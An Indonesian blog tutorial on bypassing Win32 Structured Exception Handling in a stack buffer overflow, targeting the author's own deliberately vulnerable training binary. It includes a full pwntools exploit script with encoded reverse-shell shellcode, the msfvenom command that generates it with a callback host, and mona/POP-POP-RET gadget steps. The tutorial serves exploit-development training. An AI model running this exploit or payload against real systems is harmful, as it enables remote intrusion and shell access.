---
layout: post
title: Win32 SEH bypass
date: 2018-08-31 02:38:50
categories: 
    - blog
tags:
    - windows
    - x86
    - stack buffer overflow
short_description: Mengenal SEH dan cara exploitasinya
image_preview: https://media.giphy.com/media/eCqFYAVjjDksg/giphy.gif
---

Kali ini saya akan membahas tentang sebuah mekanisme proteksi yang dapat menghalangi attacker saat ingin mengontrol register EIP ketika sudah dapat meng-overflow buffer. Mekanisme tersebut adalah Structured Exception Handler (SEH).

### SEH

SEH atau Structured Exception Handler adalah sebuah mekanisme yang digunakan untuk menangkap dan meng-handle exception / error yang terjadi saat program berjalan. Jika Anda agak sedikit bingung dengan penjelasannya, ingat block code `__try {} __except() {}` pada C ([link](https://msdn.microsoft.com/en-us/library/zazxh1a9.aspx)). Program akan menjalankan kode-kode yang ada di dalam blok __try dan ketika program menangkap sebuah error, maka kode di dalam blok __except yang akan dijalankan.

### EH untuk proteksi EIP

Ketika sedang melakukan overflow, kita pasti akan mencari kontrol terhadap register EIP. Compiler C pada windows, secara default akan membuat exception handler sendiri sehingga ketika EIP tertimpa, error akan ditangkap dan mengeluarkan info crash (pop up program crash di Windows). Dengan adanya mekanisme tersebut, maka untuk mengoverflow EIP akan lebih sulit karena alur program akan dialihkan ke kode-kode yang berada pada blok __except buatan compiler. Namun ada tehnik yang dapat digunakan untuk membypass mekanisme EH.

### Persiapan

Tools yang akan kita gunakan untuk keperluan tutorial ini sama seperti pada [artikel sebelumnya](https:/blog.fachriokt.com/c/2018/08/01/win32-classic-buffer-overflow.html). Hanya saja kita akan menggunakan compiler yang berbeda untuk target binarynya. Anda perlu menginstall [Visual Studio Build Tools](https://blogs.msdn.microsoft.com/vcblog/2017/11/02/visual-studio-build-tools-now-include-the-vs2017-and-vs2015-msvc-toolsets/) untuk bahasa pemograman C/C++. Kemudian compile source code menggunakan program CL.exe. Instruksi compile nya dapat dilihat di repo [github](https://github.com/fachrioktavian/DVCA/tree/master/SEHBufferOverflow) saya. Atau kalau Anda tidak ingin pusing dan ribet compile dll, tinggal execute saja file binary .exe yang saya berikan.

### Jalankan program

Buka tool immunity debugger dan jalankan program dvca_bof.exe

![dvca_seh.exe]({{ site.baseurl }}/images/posts/2018/p2_1.png "dvca_seh.exe dijalankan oleh immunity debugger"){:width="600"}

### Membuat program crash

Seperti pada artikel pertama, kita harus mencari letak vulnerability program dengan cara membuatnya crash. Buatlah script python sperti berikut

First we create python script to trigger program's vuln.

```Python
#!/usr/local/bin/python
#dvca_sehexploit.py

from pwn import *

def terima(p):
 data = p.recv(1024)
 log.info("recv: " + data)
def kirim(p, payload):
 p.sendline(payload)
 log.info("send: "+ payload)

evil = "A"*3000
p = remote('192.168.56.103', 31332)
terima(p)
kirim(p, evil)
```

Jalankan script dan lihat pada debugger.

![dvca_seh.exe crash]({{ site.baseurl }}/images/posts/2018/p2_2.png "dvca_seh.exe crash"){:width="600"}

Jika dilihat pada bagian register EIP tidak tertimpa oleh karater `AAAA` sama sekali, namun program crash. Hal tersebut dikarenakan Exception Handler. Pada akhir stack program, compiler meletakkan dua pointer yaitu `nSEH` dan `SEH`. Pointer SEH adalah pointer yang mengarah ke routines untuk menghandle ketika error exception terdeteksi oleh program (dalam kasus ini adalah error overflow), sedangkan nSEH adalah pointer yang mengarah ke `next SEH` atau Exception handler selanjutnya apabila routines pada pointer SEH tidak dapat meng-handle-nya.
Jika Anda perhatikan nSEH dan SEH ini akan membentuk sebuah struktur linked-list yang dinamakan `SEH chain`, gambarannya adalah sebagai berikut:

![SEH chain]({{ site.baseurl }}/images/posts/2018/p2_3.jpg "SEH chain"){:width="300"}

Pada immunity debugger, untuk melihat SEH chain dapat memilih menu `view -> SEH chain`. Pada gambar tracing debugger di atas, terlihat SE Handler mengarah ke address `0x41414141` yang tidak terdapat pada region virtual address manapun pada memory yang artinya kita berhasil mengoverflow 4 bit address SEH. Sampai sini kita dapat mengambil simpulan bahwa yang dapat dikontrol bukanlah register EIP melainkan 4 bit nSEH dan 4 bit SEH. Jadi, bagaimana kita mengubah alur program dengan hanya dapat mengontrol 8 bit pointer tersebut?

### Bypass SEH

Kita dapat mem-bypass alur exception ini dengan cara meng-overwrite 4 bit nSEH dengan `operation code yang mengarahkan program ke shellcode` kemudian meng-overwrite 4 bit SEH dengan block code dimana terdapat perintah `POP; POP; RET (PPR)` di dalamnya. Penjelasannya adalah sebagai berikut:

![SEH bypass]({{ site.baseurl }}/images/posts/2018/p2_4.jpg "SEH bypass"){:width="450"}

1. Ketika overflow terjadi, error access violation akan muncul dan men-trigger exception handler, dengan begitu alur program akan mengarah ke address yang berada di SEH dalam case kali ini berisikan address dari block code PPR

2. Perintah pop; pop; ret akan mengarahkan register EIP ke 4 bit nSEH. Dalam kasus ini 4 bit nSEH harus berisikan operation code, namun karena tidak ada shellcode yang hanya memiliki panjang 4 bit maka kita harus mencari cara lain agar alur program mencapai shellcode. Caranya yaitu dengan menggunakan opcode jmp <address>. <address> adalah alamat memori dari shellcode.

Mengapa kita tidak menggunakan `jmp esp` untuk mengganti PPR sehingga alur program akan langsung kembali ke stack dan mengeksekusi shellcode? Jawabannya adalah karena mulai dari Windows XP SP1 terdapat tambahan mekanisme pada proses SEH yaitu ketika exception terjadi, semua value yang ada di register akan di XOR dengan dirinya sendiri sehingga akan menjadi `0x00000000`. Jadi jika Anda menggunakan gadget `jmp esp` maka Anda akan diarahkan ke address `0x00000000`.

### nSEH dan SEH offset

Sebelum kita melakukan exploitasi SEH, kita harus menemukan offset yang tepat dari pointer nSEH dan SEH. Caranya masih sama seperti pada artikel pertama yaitu menggunakan msf pattern dan `!mona findmsp`

![!mona findmsp]({{ site.baseurl }}/images/posts/2018/p2_5.png "!mona findmsp"){:width="600"}

Terlihat SEH record yang dimulai dari nSEH terdapat pada offset 1104 dan pasti diikuti oleh SEH pada offset 1108. 

### Mencari PPR dengan mona

Anda tidak perlu pusing mencari PPR, mona secara otomoatis akan mencari gadget PPR di dalam region memori binary maupun dll. cukup menggunakan peritah `!mona seh`

![!mona seh]({{ site.baseurl }}/images/posts/2018/p2_6.png "!mona seh"){:width="600"}

Banyak gadget PPR dari dvca_sehlib.dll menunjukkan bahwa address ini akan selalu sama ketika dijalankan di komputer lain, sehingga exploit kita menjadi portable. Pada case kali ini saya menggunakan PPR pada address `0x19196530`

### Jmp to front

Untuk mencari opcode dari `jmp <address>`, Anda dapat menggunakan debugger untuk live edit instruksi assembly ketika program berjalan. Pertama-tama buat script python seperti sebelumnya dengan mengubah value variabel evil menjadi `evil = "A"*1104 + "\xCC"*4 + p32(ppr)` dengan `ppr = 0x19196530` lalu jalankan script tersebut.

![int3]({{ site.baseurl }}/images/posts/2018/p2_7.png "int3"){:width="450"}

Program akan berhenti pada instruksi `\xCC` atau program interrupt (int3), hal ini akan memudahkan kita untuk melakukan breakpoint. Selanjutnya edit opcode INT3 menjadi instruksi `jmp <address>` dengan <address> adalah alamat shellcode atau alamat setelah SEH dimana kita akan menempatkan shellcode disana. Pada case ini saya akan melakukan `jmp 0x0145FF1B`

![jmp short]({{ site.baseurl }}/images/posts/2018/p2_8.png "jmp short"){:width="600"}

Kita dapatkan opcode nya yaitu `EB 0D`. INT3 yang lain dapat diganti dengan NOP sehingga opcode 4 bit menjadi `jfront = 0x90900deb` dan kita perlu meletakkan setidaknya 6 bit NOP sebelum shellcode agar shellcode tereksekusi sempurna.

### Shellcode + Pwn

Generate shellcode menggunakan msfvenom `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=9876 -b '\x00' -e x86/shikata_ga_nai -f python` lalu buat script exploit final.

```python
#!/usr/local/bin/python
#dvca_sehexploit.py

from pwn import *

def terima(p):
 data = p.recv(1024)
 log.info("recv: " + data)
def kirim(p, payload):
 p.sendline(payload)
 log.info("send: "+ payload)

buf =  ""
buf += "\xb8\x46\x74\x2a\x7f\xd9\xd0\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x80\x70\xc8"
buf += "\x8a\xf0\x91\x8e\x75\x08\x62\xef\xfc\xed\x53\x2f\x9a"
buf += "\x66\xc3\x9f\xe8\x2a\xe8\x54\xbc\xde\x7b\x18\x69\xd1"
buf += "\xcc\x97\x4f\xdc\xcd\x84\xac\x7f\x4e\xd7\xe0\x5f\x6f"
buf += "\x18\xf5\x9e\xa8\x45\xf4\xf2\x61\x01\xab\xe2\x06\x5f"
buf += "\x70\x89\x55\x71\xf0\x6e\x2d\x70\xd1\x21\x25\x2b\xf1"
buf += "\xc0\xea\x47\xb8\xda\xef\x62\x72\x51\xdb\x19\x85\xb3"
buf += "\x15\xe1\x2a\xfa\x99\x10\x32\x3b\x1d\xcb\x41\x35\x5d"
buf += "\x76\x52\x82\x1f\xac\xd7\x10\x87\x27\x4f\xfc\x39\xeb"
buf += "\x16\x77\x35\x40\x5c\xdf\x5a\x57\xb1\x54\x66\xdc\x34"
buf += "\xba\xee\xa6\x12\x1e\xaa\x7d\x3a\x07\x16\xd3\x43\x57"
buf += "\xf9\x8c\xe1\x1c\x14\xd8\x9b\x7f\x71\x2d\x96\x7f\x81"
buf += "\x39\xa1\x0c\xb3\xe6\x19\x9a\xff\x6f\x84\x5d\xff\x45"
buf += "\x70\xf1\xfe\x65\x81\xd8\xc4\x32\xd1\x72\xec\x3a\xba"
buf += "\x82\x11\xef\x6d\xd2\xbd\x40\xce\x82\x7d\x31\xa6\xc8"
buf += "\x71\x6e\xd6\xf3\x5b\x07\x7d\x0e\x0c\xe8\x2a\x28\xcd"
buf += "\x80\x28\x48\xeb\xc4\xa4\xae\x99\xf4\xe0\x79\x36\x6c"
buf += "\xa9\xf1\xa7\x71\x67\x7c\xe7\xfa\x84\x81\xa6\x0a\xe0"
buf += "\x91\x5f\xfb\xbf\xcb\xf6\x04\x6a\x63\x94\x97\xf1\x73"
buf += "\xd3\x8b\xad\x24\xb4\x7a\xa4\xa0\x28\x24\x1e\xd6\xb0"
buf += "\xb0\x59\x52\x6f\x01\x67\x5b\xe2\x3d\x43\x4b\x3a\xbd"
buf += "\xcf\x3f\x92\xe8\x99\xe9\x54\x43\x68\x43\x0f\x38\x22"
buf += "\x03\xd6\x72\xf5\x55\xd7\x5e\x83\xb9\x66\x37\xd2\xc6"
buf += "\x47\xdf\xd2\xbf\xb5\x7f\x1c\x6a\x7e\x8f\x57\x36\xd7"
buf += "\x18\x3e\xa3\x65\x45\xc1\x1e\xa9\x70\x42\xaa\x52\x87"
buf += "\x5a\xdf\x57\xc3\xdc\x0c\x2a\x5c\x89\x32\x99\x5d\x98"

shellcode = buf
ppr = 0x19196530
jfront = 0x90900deb
nop = "\x90"*10

evil = "A"*1104 + p32(jfront) + p32(ppr) + nop + shellcode
p = remote('192.168.56.103', 31332)
terima(p)
kirim(p, evil)
```

Buka msfconsole lalu buat handler untuk menangkap reverse shell, jalankan script exploit final dan pwn!

![pwn]({{ site.baseurl }}/images/posts/2018/p2_9.png "pwn"){:width="600"}

### Metasploit module

Seperti pada artikel sebelumnya, exploit dalam bentuk script python dapat diubah menjadi module metasploit dalam bahasa ruby. Link modulenya sudah saya upload ke github. [exploit/windows/DVCA/sbof.rb](https://github.com/fachrioktavian/DVCA/blob/master/SEHBufferOverflow/sbof.rb)

Setelah di-copy ke direktori module DVCA, maka Anda dapat menggunakannya di msfconsole

![msfconsole]({{ site.baseurl }}/images/posts/2018/p2_10.png "msfconsole exploit module"){:width="600"}